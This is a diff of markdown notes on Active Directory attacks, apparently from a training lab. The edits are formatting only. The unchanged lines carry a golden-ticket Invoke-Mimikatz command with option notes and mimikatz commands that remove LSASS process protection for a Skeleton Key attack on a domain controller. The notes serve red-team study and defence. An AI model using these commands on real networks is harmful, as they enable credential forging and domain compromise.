@@ -130,8 +130,11 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain-n
 ```
 
 > **/ptt** : Inject the ticket in the current Powershell process/does not have the ticket on disk
+
 > **/ticket** : Saves the ticket to a file for later use
-**/startoffset** : Put proper offset values according to the domain policy using 
+
+>**/startoffset** : Put proper offset values according to the domain policy using 
+
 > **(Get-DomainPolicy -domain moneycorp.local)."kerberos policy"** else the session might get blocked/not created
 {: .prompt-info }
 
@@ -273,7 +276,8 @@ Enter-PSSession -Computername <computer-name> -credential dcorp\Administrator
 
 ### <span style="color:#F1C232">LSASS running as a protected process</span>
 In case Lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC
-```mimikatz
+
+```console
 mimikatz # privilege::debug
 mimikatz # !+
 mimikatz # !processprotect /process:lsass.exe /remove
